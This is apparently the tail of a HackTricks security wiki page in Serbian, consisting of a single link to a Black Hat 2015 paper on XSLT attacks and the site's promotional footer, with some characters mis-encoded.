* [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Å½elite li da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u**? Ili Å¾elite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **PridruÅ¾ite se** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
